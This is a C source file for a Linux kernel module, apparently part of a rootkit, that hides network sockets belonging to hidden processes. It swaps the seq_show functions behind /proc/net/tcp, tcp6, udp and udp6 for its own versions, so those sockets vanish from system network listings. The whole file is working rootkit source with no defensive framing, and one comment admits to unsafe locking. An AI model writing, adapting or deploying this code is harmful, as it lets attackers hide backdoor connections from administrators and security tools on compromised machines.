#include "sockethider.h"

#include <linux/fdtable.h>
#include <linux/net.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/version.h>
#include <net/tcp.h>
#include <net/udp.h>

#include "logging.h"
#include "pidhider.h"

/* simplify function pointer */
typedef int (*seq_show_fun)(struct seq_file*, void*);

/* original functions */
static seq_show_fun orig_tcp4_seq_show;
static seq_show_fun orig_tcp6_seq_show;
static seq_show_fun orig_udp4_seq_show;
static seq_show_fun orig_udp6_seq_show;

/* function prototypes */
static seq_show_fun replace_tcp_seq_show(seq_show_fun new_seq_show,
        const char *path);
static seq_show_fun replace_udp_seq_show(seq_show_fun new_seq_show,
        const char *path);
static int thor_tcp4_seq_show(struct seq_file *seq, void *v);
static int thor_tcp6_seq_show(struct seq_file *seq, void *v);
static int thor_udp4_seq_show(struct seq_file *seq, void *v);
static int thor_udp6_seq_show(struct seq_file *seq, void *v);
static bool is_socket_process_hidden(struct sock *sp);

int sockethider_init(void)
{
    LOG_INFO("replacing socket seq show functions");

    orig_tcp4_seq_show = replace_tcp_seq_show(thor_tcp4_seq_show, "/proc/net/tcp");
    orig_tcp6_seq_show = replace_tcp_seq_show(thor_tcp6_seq_show, "/proc/net/tcp6");
    orig_udp4_seq_show = replace_udp_seq_show(thor_udp4_seq_show, "/proc/net/udp");
    orig_udp6_seq_show = replace_udp_seq_show(thor_udp6_seq_show, "/proc/net/udp6");

    if (orig_tcp4_seq_show == NULL) {
        LOG_ERROR("could not sucessfully replace tcp4 seq show functions");
        return -1;
    }

    if (orig_tcp6_seq_show == NULL) {
        LOG_ERROR("could not sucessfully replace tcp6 seq show functions");
        return -1;
    }

    if (orig_udp4_seq_show == NULL) {
        LOG_ERROR("could not sucessfully replace udp4 seq show functions");
        return -1;
    }

    if (orig_udp6_seq_show == NULL) {
        LOG_ERROR("could not sucessfully replace udp6 seq show functions");
        return -1;
    }

    return 0;
}

void sockethider_cleanup(void)
{
    LOG_INFO("replacing socket seq show functions with original ones");

    replace_tcp_seq_show(orig_tcp4_seq_show, "/proc/net/tcp");
    replace_tcp_seq_show(orig_tcp6_seq_show, "/proc/net/tcp6");
    replace_udp_seq_show(orig_udp4_seq_show, "/proc/net/udp");
    replace_udp_seq_show(orig_udp6_seq_show, "/proc/net/udp6");
}

/* replace tcp seq show function, returns old one */
static seq_show_fun replace_tcp_seq_show(seq_show_fun new_seq_show,
        const char *path)
{
    void *old_seq_show;
    struct file *filp;
    struct tcp_seq_afinfo *afinfo;

    if ((filp = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filp->f_dentry->d_inode)->data;
#else
    afinfo = PDE_DATA(filp->f_dentry->d_inode);
#endif

    old_seq_show = afinfo->seq_ops.show;
    afinfo->seq_ops.show = new_seq_show;

    filp_close(filp, 0);

    return old_seq_show;

}

/* replace udp seq show function, returns old one */
static seq_show_fun replace_udp_seq_show(seq_show_fun new_seq_show,
        const char *path)
{
    void *old_seq_show;
    struct file *filp;
    struct udp_seq_afinfo *afinfo;

    if ((filp = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
    afinfo = PDE(filp->f_dentry->d_inode)->data;
#else
    afinfo = PDE_DATA(filp->f_dentry->d_inode);
#endif

    old_seq_show = afinfo->seq_ops.show;
    afinfo->seq_ops.show = new_seq_show;

    filp_close(filp, 0);

    return old_seq_show;
}

static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
{
    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /* call original */
    return orig_tcp4_seq_show(seq, v);
}

static int thor_tcp6_seq_show(struct seq_file *seq, void *v)
{
    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /* call original */
    return orig_tcp6_seq_show(seq, v);
}

static int thor_udp4_seq_show(struct seq_file *seq, void *v)
{
    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /* call original */
    return orig_udp4_seq_show(seq, v);
}

static int thor_udp6_seq_show(struct seq_file *seq, void *v)
{
    /* hide port */
    if (v != SEQ_START_TOKEN && is_socket_process_hidden(v))
        return 0;

    /* call original */
    return orig_udp6_seq_show(seq, v);
}

/* true if socket is owned by a hidden process */
static bool is_socket_process_hidden(struct sock *sp)
{
    struct task_struct *task;

    /* check sp */
    if (!sp || !sp->sk_socket || !sp->sk_socket->file)
        return false;

    for_each_process(task) {
        int n = 0;
        struct fdtable *fdt;
        struct files_struct *files;

        if (!task)
            continue;

        /* skip if process is not hidden */
        if (!is_pid_hidden(task->pid))
            continue;

        /* get files (unsafe but i dont care) */
        files = task->files;

        if (!files)
            continue;

        /* go through file descriptor table */
        spin_lock(&files->file_lock);
        for (fdt = files_fdtable(files); n < fdt->max_fds; n++) {
            if (!fdt->fd[n])
                continue;

            if (sp->sk_socket->file->f_inode == fdt->fd[n]->f_inode) {
                LOG_INFO("found socket --> hide it");
                spin_unlock(&files->file_lock);
                return true;
            }
        }
        spin_unlock(&files->file_lock);
    }

    return false;
}
